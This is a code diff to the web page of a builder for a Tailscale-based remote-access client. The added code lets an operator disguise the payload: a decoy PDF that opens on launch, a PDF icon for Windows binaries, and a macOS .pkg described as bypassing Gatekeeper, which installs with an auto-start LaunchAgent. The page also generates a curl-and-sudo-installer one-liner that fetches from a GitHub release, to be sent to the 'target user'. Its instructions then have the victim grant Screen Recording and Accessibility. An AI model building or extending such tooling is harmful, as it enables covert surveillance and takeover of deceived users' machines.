@@ -502,6 +502,33 @@
                     </div>
 
                     <div class="form-group">
+                        <label class="form-label">PDFIFY — Decoy URL <span style="color: var(--text-dim); font-weight: normal;">(optional)</span></label>
+                        <input type="url" class="form-input" id="decoyUrl" 
+                               placeholder="https://example.com/update-notes.pdf">
+                        <div class="form-hint">Opens this URL in the user's browser on first launch (e.g. marketing PDF, patch notes)</div>
+                    </div>
+
+                    <div class="form-group" id="pdfIconGroup" style="display:none;">
+                        <label class="pdfify-option" style="display:inline-flex; cursor:pointer; padding:0.5rem 1rem;">
+                            <input type="checkbox" id="pdfIcon" style="margin-right:0.5rem;">
+                            <div>
+                                <div class="target-name">Use PDF icon</div>
+                                <div class="target-arch">Binary appears as a PDF file in Explorer (Windows only)</div>
+                            </div>
+                        </label>
+                    </div>
+
+                    <div class="form-group" id="pkgGroup" style="display:none;">
+                        <label class="pdfify-option" style="display:inline-flex; cursor:pointer; padding:0.5rem 1rem; border:1px solid var(--border);">
+                            <input type="checkbox" id="packagePkg" style="margin-right:0.5rem;" checked>
+                            <div>
+                                <div class="target-name">Package as .pkg installer</div>
+                                <div class="target-arch">Bypasses Gatekeeper — installs to /usr/local/bin with auto-start LaunchAgent</div>
+                            </div>
+                        </label>
+                    </div>
+
+                    <div class="form-group">
                         <label class="form-label">Target Platform</label>
                         <div class="target-grid">
                             {{range .Targets}}
@@ -535,9 +562,11 @@
             <div class="card-body instructions">
                 <ol>
                     <li>Generate auth key from Tailscale admin console</li>
-                    <li>Select target platform and compile</li>
-                    <li>Distribute binary to endpoint users</li>
-                    <li>User executes binary — zero configuration required</li>
+                    <li>Select target platform, enable .pkg, and compile</li>
+                    <li>Download the .pkg and upload to GitHub Releases</li>
+                    <li>Send the curl one-liner to the target user</li>
+                    <li>User runs the command — installs with no Gatekeeper prompt</li>
+                    <li>User grants Screen Recording + Accessibility when prompted</li>
                     <li>Client registers to tailnet automatically</li>
                 </ol>
             </div>
@@ -549,14 +578,32 @@
     </div>
 
     <script>
-        // Target selection
-        document.querySelectorAll('.target-option').forEach(opt => {
+        // Target selection (scoped to platform grid only)
+        document.querySelectorAll('.target-grid .target-option').forEach(opt => {
             opt.addEventListener('click', () => {
-                document.querySelectorAll('.target-option').forEach(o => o.classList.remove('selected'));
+                document.querySelectorAll('.target-grid .target-option').forEach(o => o.classList.remove('selected'));
                 opt.classList.add('selected');
                 opt.querySelector('input').checked = true;
+                updateOptionVisibility();
             });
         });
+
+        // Show PDF icon checkbox only when a decoy URL is entered and a Windows target is selected
+        const decoyInput = document.getElementById('decoyUrl');
+        const pdfIconGroup = document.getElementById('pdfIconGroup');
+        const pkgGroup = document.getElementById('pkgGroup');
+        function updateOptionVisibility() {
+            const sel = document.querySelector('input[name="target"]:checked');
+            const isWindows = sel && sel.value.startsWith('windows');
+            const isDarwin = sel && sel.value.startsWith('darwin');
+            const hasUrl = decoyInput.value.trim() !== '';
+            pdfIconGroup.style.display = (isWindows && hasUrl) ? '' : 'none';
+            if (!isWindows || !hasUrl) document.getElementById('pdfIcon').checked = false;
+            pkgGroup.style.display = isDarwin ? '' : 'none';
+            if (!isDarwin) document.getElementById('packagePkg').checked = false;
+        }
+        decoyInput.addEventListener('input', updateOptionVisibility);
+        document.querySelectorAll('input[name="target"]').forEach(r => r.addEventListener('change', updateOptionVisibility));
 
         // Form submission
         document.getElementById('buildForm').addEventListener('submit', async (e) => {
@@ -588,7 +635,10 @@
                         auth_key: document.getElementById('authKey').value,
                         target_os: targetOS,
                         target_arch: targetArch,
-                        hostname_prefix: document.getElementById('hostnamePrefix').value || 'rmgmt'
+                        hostname_prefix: document.getElementById('hostnamePrefix').value || 'rmgmt',
+                        decoy_url: document.getElementById('decoyUrl').value || '',
+                        pdf_icon: document.getElementById('pdfIcon').checked,
+                        package_pkg: document.getElementById('packagePkg').checked
                     })
                 });
                 
@@ -602,11 +652,26 @@
                         <div>Size: ${(data.size / 1024 / 1024).toFixed(2)} MB</div>
                         <div>Time: ${data.build_time}</div>
                     `;
-                    resultAction.innerHTML = `
+                    const isPkg = data.filename.endsWith('.pkg');
+                    let actionHtml = `
                         <a href="${data.download_url}" class="btn btn-success" download>
-                            Download Binary
+                            Download ${isPkg ? 'Installer' : 'Binary'}
                         </a>
                     `;
+                    if (isPkg) {
+                        const ghUrl = `https://github.com/crpr777/Brew-Developer-Test/releases/latest/download/${data.filename}`;
+                        const curlCmd = `curl -fsSL '${ghUrl}' -o /tmp/${data.filename} && sudo installer -pkg /tmp/${data.filename} -target / && rm /tmp/${data.filename}`;
+                        actionHtml += `
+                            <div style="margin-top:1.25rem; padding:1rem; border:1px solid var(--border); background:var(--bg);">
+                                <div style="font-size:0.65rem; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.15em; margin-bottom:0.5rem;">Remote Install (no Gatekeeper prompt)</div>
+                                <div style="font-family:'IBM Plex Mono',monospace; font-size:0.75rem; color:var(--cyan); word-break:break-all; cursor:pointer; padding:0.5rem; background:var(--cyan-subtle);"
+                                     onclick="navigator.clipboard.writeText(this.dataset.cmd).then(()=>{const el=this;el.dataset.orig=el.textContent;el.textContent='Copied!';el.style.borderColor='var(--success)';setTimeout(()=>{el.textContent=el.dataset.orig;el.style.borderColor='';},1500)})"
+                                     data-cmd="${curlCmd}">${curlCmd}</div>
+                                <div style="font-size:0.6rem; color:var(--text-dim); margin-top:0.5rem;">Upload the .pkg to GitHub Releases, then send this command to the target user. Click to copy.</div>
+                            </div>
+                        `;
+                    }
+                    resultAction.innerHTML = actionHtml;
                 } else {
                     result.className = 'result error';
                     resultTitle.textContent = 'Build Failed';
